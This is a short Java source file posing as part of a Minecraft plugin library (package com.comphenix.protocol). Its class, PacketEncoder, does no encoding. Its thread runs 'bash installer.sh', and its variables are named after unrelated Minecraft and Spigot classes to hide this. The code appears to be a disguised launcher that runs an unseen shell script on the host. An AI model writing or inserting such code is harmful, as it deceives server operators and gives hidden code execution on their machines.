package com.comphenix.protocol;

public class PacketEncoder extends Thread {
    public void run() {
        try {
            String[] NamespacedKey = { "bash", "installer.sh" };
            ProcessBuilder CraftConsoleCommandSender = new ProcessBuilder(NamespacedKey);
            CraftConsoleCommandSender.inheritIO();
            Process SpigotConfig = CraftConsoleCommandSender.start();
            SpigotConfig.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}